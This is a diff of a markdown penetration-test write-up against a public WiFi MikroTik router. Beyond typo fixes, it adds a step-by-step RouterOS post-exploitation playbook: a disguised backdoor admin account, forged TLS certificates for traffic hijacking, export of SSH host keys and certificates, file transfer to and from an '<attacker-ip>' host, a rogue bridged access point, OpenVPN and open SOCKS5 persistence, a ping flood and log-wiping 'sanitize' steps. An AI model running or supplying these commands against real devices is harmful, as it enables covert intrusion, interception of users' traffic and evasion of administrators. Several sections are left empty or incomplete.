@@ -26,23 +26,23 @@ This writeup details a "Boot-to-Root" engagement targeting a Public WiFi network
 The existence of such vulnerable edge devices poses significant risks, potentially escalating to national security concerns when these networks bridge into critical infrastructure or handle sensitive data. Modern attackers frequently target these "low-hanging fruit"-outdated IoT systems and routers-to establish beachheads within otherwise secure perimeters. This report serves as a case study on the dangers of technical debt and the critical need for lifecycle management in network hardware.
 
 ## 3. Scope
-Any and all LAN/VLAN services diconnected from the centralized business/hosting platform.
+Any and all LAN/VLAN services disconnected from the centralized business/hosting platform.
 
 * **3.3 Initial**
     - The web-hosted platform `http://172.16.0.1:8000`
-    - SSH Services `127.16.0.1 22`
-    - Telnet Services `127.16.0.1 23`
-    - FTP Services `127.16.0.1 21`
-    - WinBox `127.16.0.1 8291` // _Note: Found during enum and added to scope_
-    - WebConf `127.16.0.1 55511` // _Note: Found during enum and added to scope_
+    - SSH Services `172.16.0.1 22`
+    - Telnet Services `172.16.0.1 23`
+    - FTP Services `172.16.0.1 21`
+    - WinBox `172.16.0.1 8291` // _Note: Found during enum and added to scope_
+    - WebConf `172.16.0.1 55511` // _Note: Found during enum and added to scope_
  
 * **3.4 Attack Vectors**
-    - `http://172.16.0.1:8000` Possible SQLI, XSSRF, XSS & Bufferoverflow RCE.
+    - `http://172.16.0.1:8000` Possible SQLI, CSRF, XSS & Buffer Overflow RCE.
     - `http://172.16.0.1:55511` WebConf CLI.
 
 ## 4. Methodology
 
-* **4.1 OpSec Security**
+* **4.1 Operational Security (OpSec)**
     - Use `macchanger` not only to mask your operations but for further persistence operations down the line.
     - `openvpn` is essential for further persistence techniques.
 
@@ -224,32 +224,32 @@ Target: `http://172.16.0.1:55511`
         - `user edit admin password="..."` _NOTE: This seems ineffective on `http://172.16.0.1:55519`_
         - `user edit admin password=""`
         - `user enable www`
-        - `user diable admin`
+        - `user disable admin`
 
     * **2.4 SE Implementation**
-        The objective here is to establish as user that would look similar to an `authorized` remote access/user. In our case being `MikroTik`, the configurations will be as follows.
+        The objective here is to establish a user that would look similar to an `authorized` remote access/user. In our case being `MikroTik`, the configurations will be as follows.
         - `user add copy-from=admin name="www" password="..."`
         - `user set www comment="MikroTik Remote Security Service"`
 
 * **3. PPP:Point-To-Point Profile Creation (Essential)**
-    This profile is going to be used around, in my concept I prefered the `SE` method for account creation due to the relation.
+    This profile is going to be used around; in this concept, we preferred the `SE` method for account creation due to its stealth.
     * **3.1 Execution**
         - `ppp profile add name=wwwProfile local-address=... remote-address=pool1 rate-limit=1M/1M`
     * **3.2 SE**
         - `ppp profile set comment="MikroTik Remote Web-Service Profile"`
 
-* **4. TLS Hijacking** Possibly one of the worst _vectors. Allowing for full control over data sent over the network. NOTE: This is also needed for remote access to the server directly._
+* **4. TLS Hijacking** Possibly one of the worst vectors. Allowing for full control over data sent over the network. _NOTE: This is also needed for remote access to the server directly._
     * **4.1 Check Existing Certs** Validate any existing TLS certificates.
         - `certificate print`
     * **4.2 Export Any Existing** Export any existing (proper way...)
-        - `certificate export-certificate [find name~"."] export-passphrase=""` _NOTE: This file will be able to be located using `file print`. I have noticed that the `export` command fails on direct download, further down we will implement the `tool fetch` command to `fetch` the file down to our device._
-    * **4.3 Build Your Certificates** Build you own _SE_ method.
+        - `certificate export-certificate [find name~"."] export-passphrase=""` _NOTE: This file will be able to be located using `file print`. We have noticed that the `export` command fails on direct download; further down we will implement the `tool fetch` command to `fetch` the file down to our device._
+    * **4.3 Build Your Certificates** Build your own _SE_ method.
         - `certificate add name="www" common-name="MikroTik" country="US" state=".." locality="..." organization="MikroTik" days-valid=3650 key-size=2048`
     * **4.4 Sign It**
         - `certificate sign www`
-    * **4.5 Assign To The Web-Services**
+    * **4.5 Assign To The Web Services**
         - `ip service set www certificate=www disabled=no`
-    * **4.6 Sanitize** Always santize post `export`.
+    * **4.6 Sanitize** Always sanitize post `export`.
         - `file remove cert_export_*`
     * **4.7 Remove** Delete the cert, _Nuclear Option._
         - `certificate remove www`
@@ -268,12 +268,12 @@ Target: `http://172.16.0.1:55511`
 
 * **8. The 'fetch' Tool**
     * **8.1 Dropping Files To The Box**
-        1. In a seperate terminal execute `python3 -m http.server 0.0.0.0` inside of the desired directory of deployment.
+        1. In a separate terminal execute `python3 -m http.server 0.0.0.0` inside of the desired directory of deployment.
         2. Inside of the CLI execute `tool fetch url="http://<attacker-ip>:8000/myfile.rsc" dst-path=myfile.rsc mode=http`
         3. Validate via `file print`
         4. Sanitize via `file remove file=myfile.rsc`
     * **8.2 Exporting Files From The Box**
-        1. Install the requirments.
+        1. Install the requirements.
             - `sudo apt install tftpd-hpa`
             - `sudo mkdir /tftp && sudo chmod 777 /tftp`
             - `sudo systemctl start tftp-hpa`
@@ -292,19 +292,19 @@ Target: `http://172.16.0.1:55511`
     * **9.1 Execution**
         - `tool ping-flood count=1000 size=1492 address=172.16.0.x`
 
-* **10. Firewall Rules & Bypassing** Allowing for external operations, port tunneling, and shells.
+* **10. Firewall Rules & Bypassing** Allows for external operations, port tunneling, and shells.
     * **10.1 Displaying The Current Rules**
         - `ip firewall filter print`
     * **10.2 Create A TCP Filter Rule**
         - `ip firewall filter add chain=input action=accept protocol=tcp dst-port=61337`
     
-* **11. Interface Service Binding** routerOS comes with telnet and ssh services by default.
+* **11. Interface Service Binding** RouterOS comes with telnet and ssh services by default.
     * **11.1 Listing All Services**
         - `ip service print`
     * **11.2 Targeted Service Listing**
         - `ip service print where chain=input`
     * **11.3 Setting A Service**
-        - `ip service enable <service>` or `ip service enable ssh`, however the service refuses to spawn due to inability to `system reboot`.
+        - `ip service enable <service>` or `ip service enable ssh`, however the service refuses to spawn due to inability to execute `system reboot`.
 
 * **12. SSH Persistence**
     * **12.1 Leak Any Existing Keys**
@@ -314,18 +314,23 @@ Target: `http://172.16.0.1:55511`
         - Use further methods to extract any keys.
         > NOTE: If proven futile, identify the model from the extracted information and use OSINT.
     * **12.3 Regenerating The 'Host Key'**
-        - `ip ssh regenerate-host-key` _NOTE: Took a couple a tries to get the CLI to work._
-        - `ip ssh export-host-key` _NOTE: Also took some time, often hung for a while._
+        - `ip ssh regenerate-host-key` _NOTE: Required a couple of tries to get the CLI to work._
+        - `ip ssh export-host-key` _NOTE: Also took some time, often hung for an extended period._
     * **12.4 Validate Export & Fetch**
         - `file print`
         - _NOTE: Use the methods above for exportation techniques._
         - `file print detail` to directly copy-paste the operation.
-    * **12.5 Post fetch**
-        - On the `attacker machine` execute `sudo chown 777 ssh_host_private_key(.pub)`.
+    * **12.5 Post Fetch**
+        - On the `attacker machine` execute `sudo chmod 600 ssh_host_private_key`.
         - Copy-Paste or `cat ../ssh_host_private_key.pub` into `~/.ssh/authorized_keys`.
         - Attempt the ssh `ssh admin@172.16.0.1 -i ../ssh_host_private_key`
         - PWN!
         > NOTE: Not only does it give the central key, but it also generates the `dsa`, `admin` and the `ssh_host_private_key`.
+    * **12.6 Identify The Host Machine**
+        - `ip address print`
+        - `172.16.0.11`
+        - Use the `...dsa.pub` key to connect.
+        - Command: `172.16.0.11 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss`
 
 * **13. AP Hijacking/Hosting**
     * **13.1 List Current Interfaces**
@@ -337,9 +342,57 @@ Target: `http://172.16.0.1:55511`
         - `interface wireless security-profiles add authentication-types=wpa-psk mode=dynamic-keys wpa-pre-shared-key="..." name="www" comment="MikroTik WPA Security Supplement."`
     * **13.3 Add The Virtual AP Interface** 
         - `interface wireless add name="MikroTikAP" master-interface=wlan1 mode=ap-bridge ssid="CenturyLink1337" security-profile=www disabled=no`
-        > NOTE: Here is an essential attack vector, where an attacker can clone other access points, disable the current ones, or have one completly seperate for more centralized operations. 
+        - `interface bridge port add bridge=bridge interface="MikroTikAP"`
+        > NOTE: Here is an essential attack vector, where an attacker can clone other access points, disable the current ones, or have one completely separate for more centralized operations. 
     * **13.4 Sanitize** _Nuclear Option_
         - `interface bridge port [find interface=www]` Remove the port.
         - `interface wireless remove [find name="MikroTikAP"]` Remove the AP.
         - `interface wireless security-profiles remove [find name=www]` Remove the Security Profile.
 
+* **14. OpenVPN Server/Client Hosting**
+    * **14.1 Sync The NTP Times**
+        - `system ntp client set enabled=yes primary-ntp=162.159.200.1 secondary-ntp=8.8.8.8`
+    * **14.2 Create Certificate Authority (Completed Previously) & Create The Server Template**
+        - `certificate add name=mikrotik-security-template common-name=server key-usage=digital-signature days-valid=3650 key-size=2048`
+        - Create new or use from before.
+    * **14.3 Sign Them**
+        - `certificate sign mikrotik-security-template ca=www name=MT-SecServ`
+    * **14.4 Make It Trusted**
+        - `certificate set MT-SecServ trusted=yes`
+    * **14.5 Create The Client Cert & Sign**
+        - `certificate add name=MT-SecConn common-name=... key-usage=tls-client key-size=2048`
+        - `certificate sign MT-SecConn ca=www name=...`
+    * **14.6 Export The Keys**
+        - `certificate export-certificate www export-passphrase=""` The CA.
+        - `certificate export-certificate ... export-passphrase=""` The client key.
+    * **14.7 Enable The Server**
+        - `interface ovpn-server server set enabled=yes certificate=MT-SecServ`
+    * **14.8 Validate The Firewall Rules**
+        - ``
+
+* **15. Enabling DNS For External Outreach** Allowing this exposes the `private` network (previously segmented to only allow traffic through the bridges) to access the public internet, allowing for remote CLI connections, SSH, telnet, SOCKS5, proxying & Open VPN VPS Connections.
+    * **15.1 FIX: Unable To Resolve Error**
+        - `ip dns set server=8.8.8.8,1.1.1.1 allow-remote-requests=no`
+        - `ip firewall nat add chain=srcnat action=masquerade out-interface=ether1`
+    * **15.2 Fetch External IP**
+        - `tool fetch url="https://api.ipify.org/" mode=https dst-path=pi.txt`
+        - `:put [file get pi.txt contents]`
+
+* **16. Full File Flush**
+    * **16.1 Execute**
+        - `file remove [find]`
+        - `file remove [find where name=...]`
+
+* **17. SOCKS5 'Hidden' Proxy**
+    * **17.1 Setup SOCKS5**
+        - `ip socks set enabled=yes port=...`
+        - `ip socks add action=allow src-address=0.0.0.0/0`
+    * **17.2 Add Firewall Exclusion**
+        - `ip firewall filter add chain=input protocol=tcp dst-port=... action=accept place-before=0`
+    * **17.3 Proxychains Connection**
+        - On `attaacker machine` ensure `proxychains4` installation via `sudo apt install proxychains-ng` or on termux `pkg install proxychains-ng root-repo proot`
+        - Export the key `certificate export-certificate export-passphrase=""`
+
+* **18. NAT Bypassing & Identification**
+    > NOTE: It is suspected that NAT filtering is the main reason for `remote` connections not working.
+    
